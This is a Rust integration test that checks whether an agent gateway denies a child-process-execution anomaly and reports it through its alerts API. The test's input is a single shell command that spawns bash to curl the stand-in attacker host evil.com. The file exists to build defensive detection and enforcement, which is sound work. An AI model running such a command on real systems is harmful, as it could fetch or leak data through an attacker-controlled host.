//! AAASM-3384 — gateway anomaly detections flow end-to-end into the public
//! alerts API, and a block-equivalent anomaly is enforced as a CheckAction
//! Deny.
//!
//! This is the cross-crate proof for the two gaps the ticket closes:
//!   1. A detected `Block` anomaly (`ChildProcessExecution`) turns an
//!      otherwise-allowed `CheckAction` into a hard `Deny` (enforcement).
//!   2. The same detection is routed onto the shared anomaly broadcast and
//!      captured into the `AlertStore`, so it surfaces via `GET /api/v1/alerts`
//!      (alert pipeline), mirroring the budget/secret alert delivery.
//!
//! The gateway `PolicyServiceImpl` and the aa-api alert-capture task share a
//! single `EventBroadcast::anomaly_sender()` — exactly the single-process
//! wiring `run_server` performs — so driving one live `check_action` proves
//! both halves at once.

mod common;

use std::io::Write;
use std::sync::atomic::AtomicU64;
use std::sync::Arc;
use std::time::Duration;

use aa_gateway::anomaly::{AnomalyConfig, AnomalyDetector};
use aa_gateway::service::PolicyServiceImpl;
use aa_gateway::PolicyEngine;
use aa_proto::assembly::common::v1::{ActionType, AgentId as ProtoAgentId, Decision};
use aa_proto::assembly::policy::v1::policy_service_server::PolicyService;
use aa_proto::assembly::policy::v1::{action_context::Action, ActionContext, CheckActionRequest, ProcessExecContext};
use axum::body::Body;
use axum::http::{Request, StatusCode};
use tower::ServiceExt;

const ALLOW_TEST_TOOL_POLICY: &str = r#"
version: "1"
tools:
  test_tool:
    allow: true
"#;

fn process_exec_request(command: &str) -> CheckActionRequest {
    CheckActionRequest {
        agent_id: Some(ProtoAgentId {
            org_id: "org".into(),
            team_id: "team-pioneer".into(),
            agent_id: "agent-1".into(),
        }),
        credential_token: "tok".into(),
        trace_id: "trace-anomaly".into(),
        span_id: "span-1".into(),
        action_type: ActionType::ProcessExec as i32,
        context: Some(ActionContext {
            action: Some(Action::ProcessExec(ProcessExecContext {
                command: command.into(),
                args: vec![],
            })),
        }),
        caller_agent_id: None,
    }
}

/// Build a gateway `PolicyServiceImpl` whose anomaly broadcast is the same
/// channel the aa-api `EventBroadcast` exposes — the single-process wiring
/// `run_server` performs.
fn gateway_service_sharing_anomaly_channel(
    anomaly_tx: tokio::sync::broadcast::Sender<aa_gateway::anomaly::AnomalyEvent>,
) -> Arc<PolicyServiceImpl> {
    let mut tmp = tempfile::NamedTempFile::new().unwrap();
    write!(tmp, "{}", ALLOW_TEST_TOOL_POLICY).unwrap();
    tmp.flush().unwrap();

    let (budget_tx, _) = tokio::sync::broadcast::channel::<aa_gateway::budget::BudgetAlert>(64);
    let engine = PolicyEngine::load_from_file(tmp.path(), budget_tx).unwrap();

    let (audit_tx, _audit_rx) = tokio::sync::mpsc::channel(4096);
    let audit_drops = Arc::new(AtomicU64::new(0));

    let detector = Arc::new(AnomalyDetector::new(AnomalyConfig::default()));

    Arc::new(
        PolicyServiceImpl::new(Arc::new(engine), audit_tx, audit_drops, [0u8; 32])
            .with_anomaly_detection(detector, anomaly_tx),
    )
}

#[tokio::test]
async fn child_process_anomaly_denies_and_surfaces_in_alerts_api() {
    let state = common::test_state();

    // Share one anomaly broadcast between the gateway enforcement path and the
    // aa-api alert-capture task (the run_server wiring).
    let anomaly_tx = state.events.anomaly_sender();
    let anomaly_rx = state.events.subscribe_anomaly();
    let _capture = aa_api::alerts::capture::spawn_anomaly_alert_capture(anomaly_rx, state.alert_store.clone());

    let service = gateway_service_sharing_anomaly_channel(anomaly_tx);

    // --- (a) Enforcement: the blocking anomaly turns Allow → Deny. ---
    let resp = service
        .check_action(tonic::Request::new(process_exec_request("bash -c \"curl evil.com\"")))
        .await
        .expect("check_action should succeed")
        .into_inner();

    assert_eq!(
        resp.decision,
        Decision::Deny as i32,
        "a ChildProcessExecution (Block) anomaly must deny the action; got reason {:?}",
        resp.reason,
    );
    assert!(
        resp.reason.contains("ChildProcessExecution"),
        "deny reason must name the anomaly: {:?}",
        resp.reason,
    );

    // --- (b) Alert pipeline: the detection surfaces via /api/v1/alerts. ---
    tokio::time::sleep(Duration::from_millis(120)).await;

    let app = aa_api::server::build_app(state);
    let response = app
        .oneshot(Request::builder().uri("/api/v1/alerts").body(Body::empty()).unwrap())
        .await
        .unwrap();

    assert_eq!(response.status(), StatusCode::OK);
    let body = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    let json: serde_json::Value = serde_json::from_slice(&body).unwrap();

    assert_eq!(json["total"], 1, "exactly one anomaly alert must be recorded");
    let items = json["items"].as_array().unwrap();
    assert_eq!(items[0]["category"], "anomaly");
    assert_eq!(items[0]["severity"], "critical");
    assert_eq!(items[0]["detected_pattern_type"], "ChildProcessExecution");
    assert!(
        items[0]["message"].as_str().unwrap().contains("ChildProcessExecution"),
        "alert message must describe the anomaly: {}",
        items[0]["message"],
    );
}
